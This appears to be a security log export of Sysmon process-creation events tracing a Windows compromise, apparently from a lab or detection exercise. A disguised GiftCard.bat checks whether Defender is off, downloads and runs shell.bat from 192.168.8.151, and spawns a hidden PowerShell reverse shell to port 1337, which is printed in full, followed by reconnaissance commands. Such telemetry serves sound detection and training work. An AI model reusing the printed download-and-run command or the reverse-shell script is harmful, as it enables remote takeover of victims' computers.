{"preview":false,"result":{"_time":"2024-01-04T20:02:26.274-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"dllhost.exe","CommandLine":"\"C:\\Windows\\SysWOW64\\DllHost.exe\" /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}","process_name":"dllhost.exe","parent_process":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"}}
{"preview":false,"result":{"_time":"2024-01-04T20:01:02.491-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"netstat.exe","CommandLine":"netstat  -nao","process_name":"NETSTAT.EXE","parent_process":"\"cmd.exe\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:51.933-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"sysinfo.exe","CommandLine":"systeminfo","process_name":"systeminfo.exe","parent_process":"\"cmd.exe\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:42.893-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"ipconfig.exe","CommandLine":"ipconfig  /all","process_name":"ipconfig.exe","parent_process":"\"cmd.exe\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:35.492-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"whoami.exe","CommandLine":"whoami","process_name":"whoami.exe","parent_process":"\"cmd.exe\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:12.954-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"Cmd.Exe","CommandLine":"\"cmd.exe\"","process_name":"cmd.exe","parent_process":"powershell  -w hidden -nop -c $a='192.168.8.151';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}"}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:12.692-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell  -w hidden -nop -c $a='192.168.8.151';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}","process_name":"powershell.exe","parent_process":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Windows\\Temp\\shell.bat\"\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:12.681-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"Cmd.Exe","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Windows\\Temp\\shell.bat\"\"","process_name":"cmd.exe","parent_process":"powershell  -Command \"&amp; {if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://192.168.8.151:8000/shell.txt -OutFile c:\\Windows\\Temp\\shell.bat; c:\\Windows\\Temp\\shell.bat }}\""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:11.952-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell  -Command \"&amp; {if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://192.168.8.151:8000/shell.txt -OutFile c:\\Windows\\Temp\\shell.bat; c:\\Windows\\Temp\\shell.bat }}\"","process_name":"powershell.exe","parent_process":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\MS1\\Desktop\\GiftCard\\GiftCard.bat\" \""}}
{"preview":false,"result":{"_time":"2024-01-04T20:00:11.855-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"Cmd.Exe","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\MS1\\Desktop\\GiftCard\\GiftCard.bat\" \"","process_name":"cmd.exe","parent_process":"C:\\Windows\\Explorer.EXE"}}
{"preview":false,"lastrow":true,"result":{"_time":"2024-01-04T20:00:04.332-08:00","EventCode":"1","EventDescription":"Process creation","OriginalFileName":"dllhost.exe","CommandLine":"\"C:\\Windows\\SysWOW64\\DllHost.exe\" /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}","process_name":"dllhost.exe","parent_process":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"}}
